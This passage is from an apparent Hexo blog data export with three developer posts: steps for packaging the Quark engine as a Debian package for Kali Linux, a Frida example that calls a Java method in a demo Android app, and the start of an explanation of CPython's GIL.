ago, I would like to package Quark to Debian package since we want to make Quark be part of Kali Linux. You can have a look at the link below.</p>\n<p><a href=\"https://bugs.kali.org/view.php?id=7121\">Kali Linux issue 0007121</a></p>\n<h2 id=\"Kali-Linux-Release\"><a href=\"#Kali-Linux-Release\" class=\"headerlink\" title=\"Kali Linux Release\"></a>Kali Linux Release</h2><h3 id=\"1-Prepare-your-Kali-Linux-virtual-machine-to-build-the-Debian-package\"><a href=\"#1-Prepare-your-Kali-Linux-virtual-machine-to-build-the-Debian-package\" class=\"headerlink\" title=\"1. Prepare your Kali Linux virtual machine to build the Debian package.\"></a>1. Prepare your Kali Linux virtual machine to build the Debian package.</h3><ul>\n<li><a href=\"https://www.virtualbox.org/wiki/Downloads\">Virtualbox</a></li>\n<li><a href=\"https://www.kali.org/get-kali/#kali-virtual-machines\">Kail Linux image for virtualbox</a></li>\n</ul>\n<h4 id=\"Update-your-kali-Linux-package-source\"><a href=\"#Update-your-kali-Linux-package-source\" class=\"headerlink\" title=\"Update your kali Linux package source\"></a>Update your kali Linux package source</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n\n<p>After setting up your virtual machine, you have to install the required packages based on the official documentation on this <a href=\"https://www.kali.org/docs/development/setting-up-packaging-system/\">website</a>.</p>\n<h4 id=\"Install-the-required-dependencies\"><a href=\"#Install-the-required-dependencies\" class=\"headerlink\" title=\"Install the required dependencies\"></a>Install the required dependencies</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install -y packaging-dev apt-file gitk mr</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get install -y devscripts debhelper dh-make git-buildpackage sbuild dh-python python3-all</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Set-up-sbuild-and-log-in-again-after-completion\"><a href=\"#Set-up-sbuild-and-log-in-again-after-completion\" class=\"headerlink\" title=\"Set up sbuild and log in again after completion\"></a>Set up sbuild and log in again after completion</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mkdir -p /srv/chroots/</span><br><span class=\"line\"></span><br><span class=\"line\">cd /srv/chroots/</span><br><span class=\"line\"></span><br><span class=\"line\">sudo sbuild-createchroot --keyring=/usr/share/keyrings/kali-archive-keyring.gpg --arch=amd64 --components=main,contrib,non-free --include=kali-archive-keyring kali-dev kali-dev-amd64-sbuild http://http.kali.org/kali</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;source-root-groups=root,sbuild&quot; | sudo tee -a /etc/schroot/chroot.d/kali-dev-amd64-sbuild*</span><br><span class=\"line\"></span><br><span class=\"line\">sudo sbuild-adduser $USER</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Creating-the-Debian-files\"><a href=\"#2-Creating-the-Debian-files\" class=\"headerlink\" title=\"2. Creating the Debian files\"></a>2. Creating the Debian files</h3><p>The Debian package needs that the following four files are required in the debian directory.</p>\n<ul>\n<li>control</li>\n<li>copyright</li>\n<li>changelog</li>\n<li>rules</li>\n</ul>\n<p><a href=\"https://www.debian.org/doc/manuals/maint-guide/dreq.en.html\">Here</a> is the official documentation on how to write all four files.</p>\n<h3 id=\"3-Importing-the-Quark-project\"><a href=\"#3-Importing-the-Quark-project\" class=\"headerlink\" title=\"3. Importing the Quark project\"></a>3. Importing the Quark project</h3><p>Please replace the version number you would like to update.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/kali/packages/quark-engine ~/kali/upstream/</span><br><span class=\"line\"></span><br><span class=\"line\">wget https://github.com/quark-engine/quark-engine/archive/refs/tags/v21.4.3.tar.gz  -O ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /home/kali/kali/packages/quark-engine</span><br><span class=\"line\"></span><br><span class=\"line\">git init</span><br><span class=\"line\"></span><br><span class=\"line\">gbp import-orig ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"4-Build-Package\"><a href=\"#4-Build-Package\" class=\"headerlink\" title=\"4. Build Package\"></a>4. Build Package</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gbp buildpackage --git-builder=sbuild</span><br></pre></td></tr></table></figure>\n\n<p>Then you will have the Quark <code>.deb</code> file if everything goes well.</p>\n<h3 id=\"5-Request-package-upgrade\"><a href=\"#5-Request-package-upgrade\" class=\"headerlink\" title=\"5. Request package upgrade\"></a>5. Request package upgrade</h3><ol>\n<li><p>Register <a href=\"https://bugs.kali.org/my_view_page.php\">Kali Linux Bug Tracker</a></p>\n</li>\n<li><p>Report an issue</p>\n</li>\n</ol>\n<p>Report an issue by clicking the “Report Issue”</p>\n<p><img src=\"https://i.imgur.com/R7fGbSY.png\"></p>\n<ol start=\"3\">\n<li>Fill out the form</li>\n</ol>\n<p>Please choose the “Tool upgrade request” option in <code>category</code> and “kali-dev” option in <code>product version</code> and keep anything else default value.</p>\n<p><img src=\"https://i.imgur.com/Wclavqq.png\"></p>\n<p>The next step is filling out the summary and the description.</p>\n<ol start=\"4\">\n<li>Attach the .deb file</li>\n</ol>\n<p>Upload the <code>.deb</code> file you just created earlier.</p>\n<p><img src=\"https://i.imgur.com/5Mbu3hf.png\"></p>\n<ol start=\"5\">\n<li>Submit the issue</li>\n</ol>\n<p>When everything is all set, you can click “Submit issue”.</p>\n<p>Reference<br><a href=\"https://www.kali.org/docs/development/public-packaging/\">https://www.kali.org/docs/development/public-packaging/</a><br><a href=\"https://www.kali.org/docs/development/intro-to-packaging-example/\">https://www.kali.org/docs/development/intro-to-packaging-example/</a><br><a href=\"https://www.kali.org/docs/development/setting-up-packaging-system/\">https://www.kali.org/docs/development/setting-up-packaging-system/</a><br><a href=\"https://www.kali.org/docs/development/advanced-packaging-example/\">https://www.kali.org/docs/development/advanced-packaging-example/</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Debian-Packaging\"><a href=\"#Debian-Packaging\" class=\"headerlink\" title=\"Debian Packaging\"></a>Debian Packaging</h1><p>A while ago, I would like to package Quark to Debian package since we want to make Quark be part of Kali Linux. You can have a look at the link below.</p>\n<p><a href=\"https://bugs.kali.org/view.php?id=7121\">Kali Linux issue 0007121</a></p>\n<h2 id=\"Kali-Linux-Release\"><a href=\"#Kali-Linux-Release\" class=\"headerlink\" title=\"Kali Linux Release\"></a>Kali Linux Release</h2><h3 id=\"1-Prepare-your-Kali-Linux-virtual-machine-to-build-the-Debian-package\"><a href=\"#1-Prepare-your-Kali-Linux-virtual-machine-to-build-the-Debian-package\" class=\"headerlink\" title=\"1. Prepare your Kali Linux virtual machine to build the Debian package.\"></a>1. Prepare your Kali Linux virtual machine to build the Debian package.</h3><ul>\n<li><a href=\"https://www.virtualbox.org/wiki/Downloads\">Virtualbox</a></li>\n<li><a href=\"https://www.kali.org/get-kali/#kali-virtual-machines\">Kail Linux image for virtualbox</a></li>\n</ul>\n<h4 id=\"Update-your-kali-Linux-package-source\"><a href=\"#Update-your-kali-Linux-package-source\" class=\"headerlink\" title=\"Update your kali Linux package source\"></a>Update your kali Linux package source</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n\n<p>After setting up your virtual machine, you have to install the required packages based on the official documentation on this <a href=\"https://www.kali.org/docs/development/setting-up-packaging-system/\">website</a>.</p>\n<h4 id=\"Install-the-required-dependencies\"><a href=\"#Install-the-required-dependencies\" class=\"headerlink\" title=\"Install the required dependencies\"></a>Install the required dependencies</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install -y packaging-dev apt-file gitk mr</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get install -y devscripts debhelper dh-make git-buildpackage sbuild dh-python python3-all</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Set-up-sbuild-and-log-in-again-after-completion\"><a href=\"#Set-up-sbuild-and-log-in-again-after-completion\" class=\"headerlink\" title=\"Set up sbuild and log in again after completion\"></a>Set up sbuild and log in again after completion</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mkdir -p /srv/chroots/</span><br><span class=\"line\"></span><br><span class=\"line\">cd /srv/chroots/</span><br><span class=\"line\"></span><br><span class=\"line\">sudo sbuild-createchroot --keyring=/usr/share/keyrings/kali-archive-keyring.gpg --arch=amd64 --components=main,contrib,non-free --include=kali-archive-keyring kali-dev kali-dev-amd64-sbuild http://http.kali.org/kali</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;source-root-groups=root,sbuild&quot; | sudo tee -a /etc/schroot/chroot.d/kali-dev-amd64-sbuild*</span><br><span class=\"line\"></span><br><span class=\"line\">sudo sbuild-adduser $USER</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Creating-the-Debian-files\"><a href=\"#2-Creating-the-Debian-files\" class=\"headerlink\" title=\"2. Creating the Debian files\"></a>2. Creating the Debian files</h3><p>The Debian package needs that the following four files are required in the debian directory.</p>\n<ul>\n<li>control</li>\n<li>copyright</li>\n<li>changelog</li>\n<li>rules</li>\n</ul>\n<p><a href=\"https://www.debian.org/doc/manuals/maint-guide/dreq.en.html\">Here</a> is the official documentation on how to write all four files.</p>\n<h3 id=\"3-Importing-the-Quark-project\"><a href=\"#3-Importing-the-Quark-project\" class=\"headerlink\" title=\"3. Importing the Quark project\"></a>3. Importing the Quark project</h3><p>Please replace the version number you would like to update.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/kali/packages/quark-engine ~/kali/upstream/</span><br><span class=\"line\"></span><br><span class=\"line\">wget https://github.com/quark-engine/quark-engine/archive/refs/tags/v21.4.3.tar.gz  -O ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /home/kali/kali/packages/quark-engine</span><br><span class=\"line\"></span><br><span class=\"line\">git init</span><br><span class=\"line\"></span><br><span class=\"line\">gbp import-orig ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"4-Build-Package\"><a href=\"#4-Build-Package\" class=\"headerlink\" title=\"4. Build Package\"></a>4. Build Package</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gbp buildpackage --git-builder=sbuild</span><br></pre></td></tr></table></figure>\n\n<p>Then you will have the Quark <code>.deb</code> file if everything goes well.</p>\n<h3 id=\"5-Request-package-upgrade\"><a href=\"#5-Request-package-upgrade\" class=\"headerlink\" title=\"5. Request package upgrade\"></a>5. Request package upgrade</h3><ol>\n<li><p>Register <a href=\"https://bugs.kali.org/my_view_page.php\">Kali Linux Bug Tracker</a></p>\n</li>\n<li><p>Report an issue</p>\n</li>\n</ol>\n<p>Report an issue by clicking the “Report Issue”</p>\n<p><img src=\"https://i.imgur.com/R7fGbSY.png\"></p>\n<ol start=\"3\">\n<li>Fill out the form</li>\n</ol>\n<p>Please choose the “Tool upgrade request” option in <code>category</code> and “kali-dev” option in <code>product version</code> and keep anything else default value.</p>\n<p><img src=\"https://i.imgur.com/Wclavqq.png\"></p>\n<p>The next step is filling out the summary and the description.</p>\n<ol start=\"4\">\n<li>Attach the .deb file</li>\n</ol>\n<p>Upload the <code>.deb</code> file you just created earlier.</p>\n<p><img src=\"https://i.imgur.com/5Mbu3hf.png\"></p>\n<ol start=\"5\">\n<li>Submit the issue</li>\n</ol>\n<p>When everything is all set, you can click “Submit issue”.</p>\n<p>Reference<br><a href=\"https://www.kali.org/docs/development/public-packaging/\">https://www.kali.org/docs/development/public-packaging/</a><br><a href=\"https://www.kali.org/docs/development/intro-to-packaging-example/\">https://www.kali.org/docs/development/intro-to-packaging-example/</a><br><a href=\"https://www.kali.org/docs/development/setting-up-packaging-system/\">https://www.kali.org/docs/development/setting-up-packaging-system/</a><br><a href=\"https://www.kali.org/docs/development/advanced-packaging-example/\">https://www.kali.org/docs/development/advanced-packaging-example/</a></p>\n"},{"title":"Frida tips","date":"2022-04-22T07:07:07.000Z","_content":"# Frida tips for dynamically calling Java class methods in Android\n\n\n\n## Android example code snippet\n```java=\npackage com.example.test;\n\nimport android.os.Bundle;\nimport android.util.Log;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n    }\n\n\n}\n\n\nclass Foo {\n\n    public int sum(int num1, int num2) {\n\n        Log.i(\"Foo\", \"Called by frida\");\n        Log.i(\"Foo\", String.valueOf(num1 + num2));\n        return num1 + num2;\n\n\n    }\n\n}\n```\n\n## Frida Javascript\n\n```javascript=\nfunction main(){\n    Java.perform(function(){\n        console.log(\"Android class method invocation\");\n        var instance = Java.use(\"com.example.test.Foo\").$new();\n        console.log(instance.sum(9,9));\n        console.log(instance.sum(3,6));\n        console.log(instance.sum(1,2));\n    })\n}\n\nmain();\n```\n\n## Command-line\n\n```bash=\nfrida -U -f com.example.test -l test.js --no-pause\n```\n\n\n","source":"_posts/Frida-tips.md","raw":"---\ntitle: Frida tips\ndate: 2022-04-22 15:07:07\ntags:\n---\n# Frida tips for dynamically calling Java class methods in Android\n\n\n\n## Android example code snippet\n```java=\npackage com.example.test;\n\nimport android.os.Bundle;\nimport android.util.Log;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\npublic class MainActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n    }\n\n\n}\n\n\nclass Foo {\n\n    public int sum(int num1, int num2) {\n\n        Log.i(\"Foo\", \"Called by frida\");\n        Log.i(\"Foo\", String.valueOf(num1 + num2));\n        return num1 + num2;\n\n\n    }\n\n}\n```\n\n## Frida Javascript\n\n```javascript=\nfunction main(){\n    Java.perform(function(){\n        console.log(\"Android class method invocation\");\n        var instance = Java.use(\"com.example.test.Foo\").$new();\n        console.log(instance.sum(9,9));\n        console.log(instance.sum(3,6));\n        console.log(instance.sum(1,2));\n    })\n}\n\nmain();\n```\n\n## Command-line\n\n```bash=\nfrida -U -f com.example.test -l test.js --no-pause\n```\n\n\n","slug":"Frida-tips","published":1,"updated":"2023-04-20T07:41:28.341Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmr0008i7ri1ua694i6","content":"<h1 id=\"Frida-tips-for-dynamically-calling-Java-class-methods-in-Android\"><a href=\"#Frida-tips-for-dynamically-calling-Java-class-methods-in-Android\" class=\"headerlink\" title=\"Frida tips for dynamically calling Java class methods in Android\"></a>Frida tips for dynamically calling Java class methods in Android</h1><h2 id=\"Android-example-code-snippet\"><a href=\"#Android-example-code-snippet\" class=\"headerlink\" title=\"Android example code snippet\"></a>Android example code snippet</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> android.os.Bundle;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.util.Log;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Foo</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">sum</span><span class=\"params\">(<span class=\"type\">int</span> num1, <span class=\"type\">int</span> num2)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Log.i(<span class=\"string\">&quot;Foo&quot;</span>, <span class=\"string\">&quot;Called by frida&quot;</span>);</span><br><span class=\"line\">        Log.i(<span class=\"string\">&quot;Foo&quot;</span>, String.valueOf(num1 + num2));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> num1 + num2;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Frida-Javascript\"><a href=\"#Frida-Javascript\" class=\"headerlink\" title=\"Frida Javascript\"></a>Frida Javascript</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;Android class method invocation&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> instance = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;com.example.test.Foo&quot;</span>).$new();</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(instance.<span class=\"title function_\">sum</span>(<span class=\"number\">9</span>,<span class=\"number\">9</span>));</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(instance.<span class=\"title function_\">sum</span>(<span class=\"number\">3</span>,<span class=\"number\">6</span>));</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(instance.<span class=\"title function_\">sum</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>));</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Command-line\"><a href=\"#Command-line\" class=\"headerlink\" title=\"Command-line\"></a>Command-line</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frida -U -f com.example.test -l test.js --no-pause</span><br></pre></td></tr></table></figure>\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Frida-tips-for-dynamically-calling-Java-class-methods-in-Android\"><a href=\"#Frida-tips-for-dynamically-calling-Java-class-methods-in-Android\" class=\"headerlink\" title=\"Frida tips for dynamically calling Java class methods in Android\"></a>Frida tips for dynamically calling Java class methods in Android</h1><h2 id=\"Android-example-code-snippet\"><a href=\"#Android-example-code-snippet\" class=\"headerlink\" title=\"Android example code snippet\"></a>Android example code snippet</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.test;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> android.os.Bundle;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.util.Log;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Foo</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">sum</span><span class=\"params\">(<span class=\"type\">int</span> num1, <span class=\"type\">int</span> num2)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Log.i(<span class=\"string\">&quot;Foo&quot;</span>, <span class=\"string\">&quot;Called by frida&quot;</span>);</span><br><span class=\"line\">        Log.i(<span class=\"string\">&quot;Foo&quot;</span>, String.valueOf(num1 + num2));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> num1 + num2;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Frida-Javascript\"><a href=\"#Frida-Javascript\" class=\"headerlink\" title=\"Frida Javascript\"></a>Frida Javascript</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;Android class method invocation&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> instance = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;com.example.test.Foo&quot;</span>).$new();</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(instance.<span class=\"title function_\">sum</span>(<span class=\"number\">9</span>,<span class=\"number\">9</span>));</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(instance.<span class=\"title function_\">sum</span>(<span class=\"number\">3</span>,<span class=\"number\">6</span>));</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(instance.<span class=\"title function_\">sum</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>));</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Command-line\"><a href=\"#Command-line\" class=\"headerlink\" title=\"Command-line\"></a>Command-line</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frida -U -f com.example.test -l test.js --no-pause</span><br></pre></td></tr></table></figure>\n\n\n"},{"title":"GIL, the magic lock inside the CPython","date":"2021-11-24T02:42:53.000Z","_content":"\n# GIL, the magic lock inside the CPython\n\nWhat makes Python different from other languages, the GIL(**Global Interpreter Lock**) must be the cherry on top of the cake.\n\nSimply put, the GIL is a lock inside the CPython interpreter to prevent the reference counting of an object from becoming a race condition at the bytecode level.\n\nThe reference counting would look like this:\n\n```python=\nimport sys\na = [1,2]\nb = a\n\nprint(sys.getrefcount(a)) # 3\n```\n\nSince Python garbage collection uses reference counting to check unused objects at runtime, each object in the runtime will use a number count to check whether it is used by other objects. If not, then CPython will delete the object to free the memory to avoid memory leaks.\n\n## Disadvantages\n\nThe purpose of using the GIL is to deal with the issue of reference counting. However, due to this lock, there are some disadvantages related to it. For example:\n\n1. Threads in Python become useless, especially when dealing with CPU-bound tasks. Moreover, it slows down even lower than a single thread.\n2. When using multi-threads or multi-process, even if there is a GIL, the locking mechanism is still needed.\n\n## Comparison of single-process, multi-thread, multi-process, and process pool.\n\nIf we conduct a simple test to write our program using the above four methods to compare the speed, then we can see the result by order will like below:\n\nMulti-process-pool > Multi-process > Single process > Multi-thread\n\nThe reason why multithreading is the last one is because of the GIL, even if there are many threads, tasks in Python can still only run on a single 